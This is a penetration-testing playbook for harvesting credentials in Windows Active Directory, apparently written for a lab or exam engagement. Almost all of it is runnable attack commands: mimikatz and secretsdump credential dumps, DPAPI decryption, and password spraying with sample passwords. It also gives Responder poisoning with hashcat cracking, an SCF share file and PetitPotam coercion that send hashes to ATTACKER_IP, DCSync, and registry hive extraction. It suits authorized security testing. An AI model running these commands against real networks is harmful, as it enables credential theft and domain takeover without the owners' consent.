# Phase 2: Credential Harvesting

## Gate: At least one valid credential obtained (password, hash, or ticket)

## Steps

### 2.0 DPAPI Credential Harvest (when SYSTEM on domain-joined host)
```bash
# 1. SAM + LSA secrets (always first)
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
# Or: mimikatz "lsadump::sam" "lsadump::secrets" "sekurlsa::logonpasswords"

# 2. Find DPAPI credential files
dir /a /s C:\Users\*\AppData\Roaming\Microsoft\Credentials\*
dir /a /s C:\Users\*\AppData\Local\Microsoft\Credentials\*

# 3. Identify master key GUIDs needed
mimikatz "dpapi::cred /in:<credential_file>"  → note guidMasterKey

# 4. DECISION TREE:
#    - dwDomainKeyLen > 0 = domain user → need domain backup key (DA) or user password
#    - dwDomainKeyLen = 0 = local user → need user cleartext password
#    - dwFlags 0x20000000 (system) = machine-level DPAPI
#    → If you don't have the required key: TIME-BOX 30 MIN then MOVE ON
#    → MOVE ON TO (in order): Kerberoasting → ADCS → Relay/Coercion → Password Spray
#    → Do NOT loop back to DPAPI until you have DA or the user's cleartext password

# 5. Try decryption paths:
mimikatz "dpapi::masterkey /in:<masterkey_file> /sid:<user_SID> /password:<pw>"
mimikatz "dpapi::masterkey /in:<masterkey_file> /rpc"  # uses machine Kerberos
mimikatz "dpapi::masterkey /in:<masterkey_file> /system:0x<dpapi_machinekey>"

# 6. If masterkey decrypted → decrypt credential
mimikatz "dpapi::cred /in:<cred_file> /masterkey:<decrypted_key>"
```

### 2.1 Password Spraying (CAREFUL — respect lockout policy)
```bash
# Check policy FIRST (from Phase 1)
# If lockout = 5, spray MAX 2 attempts per window

# Common passwords to try:
# Season+Year (Summer2026, Winter2025)
# Company+123 (CorpName123, Jago2026!)
# Welcome1, Password1, P@ssw0rd

# Spray with CrackMapExec
crackmapexec smb <DC> -u users.txt -p 'Summer2026!' --continue-on-success
# STOP if you see lockouts

# Spray LDAP (less noisy than SMB)
crackmapexec ldap <DC> -u users.txt -p 'Welcome1' --continue-on-success
```

### 2.2 Responder (LLMNR/NBT-NS/mDNS Poisoning)
```bash
# Passive first — observe traffic
responder -I eth0 -A  # Analyze mode (no poisoning)

# Active poisoning (authorized only!)
responder -I eth0 -wrf
# Captures NTLMv2 hashes → crack with hashcat

# Crack NTLMv2
hashcat -m 5600 hashes.txt /path/to/wordlist.txt -r rules/best64.rule
```

### 2.3 NTLM Hash from Shares/Services
```bash
# SCF/URL file attack (drop in writable share)
# Create: @attacker.scf
echo "[Shell]" > @attacker.scf
echo "Command=2" >> @attacker.scf
echo "[Taskbar]" >> @attacker.scf
echo "Command=ToggleDesktop" >> @attacker.scf
echo "IconFile=\\\\ATTACKER_IP\\share\\icon.ico" >> @attacker.scf
# Drop in writable share, Responder captures hash when users browse

# Coerce authentication (PetitPotam, PrinterBug, DFSCoerce)
python3 PetitPotam.py -d corp.local -u user -p pass ATTACKER_IP <DC>
```

### 2.4 Credential Stores
```bash
# GPP Passwords (legacy Group Policy Preferences)
crackmapexec smb <DC> -u user -p pass -M gpp_password

# LAPS (Local Administrator Password Solution)
crackmapexec smb <DC> -u user -p pass -M laps

# SYSVOL scripts (batch files with creds)
smbclient //DC/SYSVOL -U user%pass -c 'recurse; ls'
# Download and grep for passwords
```

### 2.5 From Compromised Host
```bash
# Mimikatz (if on Windows with admin)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam
mimikatz# lsadump::dcsync /user:Administrator

# From Linux (via impacket)
impacket-secretsdump DOMAIN/admin:pass@<target>
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### 2.5b Windows Credential Manager Extraction (without mimikatz)

When mimikatz is unavailable (wrong arch, AV, no binary upload):

```cmd
:: 1. List stored credentials (as SYSTEM or target user)
cmdkey /list

:: 2. Find credential files on disk
dir /a /s C:\Users\*\AppData\Roaming\Microsoft\Credentials\*
dir /a /s C:\Users\*\AppData\Local\Microsoft\Credentials\*

:: 3. Find DPAPI master keys
dir /a /s C:\Users\*\AppData\Roaming\Microsoft\Protect\*
```

**Decryption paths (SYSTEM on domain-joined host):**
```powershell
# Method 1: PowerShell DPAPI (works for LocalMachine scope only)
Add-Type -AssemblyName System.Security
$bytes = [IO.File]::ReadAllBytes("C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\<GUID>")
$dec = [Security.Cryptography.ProtectedData]::Unprotect($bytes,$null,'LocalMachine')
[Text.Encoding]::Unicode.GetString($dec)

# Method 2: Use saved creds via runas (if /savecred was used)
runas /savecred /user:DOMAIN\user "cmd /c type \\DC\C$\flag.txt > C:\temp\out.txt"

# Method 3: Extract via reg hives + impacket offline
reg save HKLM\SAM C:\Windows\Temp\sam /y
reg save HKLM\SYSTEM C:\Windows\Temp\system /y
reg save HKLM\SECURITY C:\Windows\Temp\security /y
# Download and parse with: impacket-secretsdump -sam sam -system system -security security LOCAL
# LSA secrets include: DefaultPassword, DPAPI_SYSTEM keys, machine account hash
```

**Key lesson (SecOps Exam, June 2026):** SYSTEM on domain-joined .8 couldn't decrypt Godmode's DPAPI credential (DomainKeyLen > 0 = needs domain backup key or user password). Wasted 30+ min. Should have followed TIME-BOX rule and moved to Kerberoasting/relay.

### 2.6 Credential Inventory
Maintain `phase2-creds/credential-inventory.md`:
```
| Username | Type | Value | Source | Tested | Access Level |
|----------|------|-------|--------|--------|-------------|
| svc_sql  | NTHash | aad3b435... | Kerberoast | Yes | SQL Admin |
| admin.jsmith | Password | Summer2026! | Spray | Yes | Domain Admin |
```

Every credential → test immediately → document what it accesses.
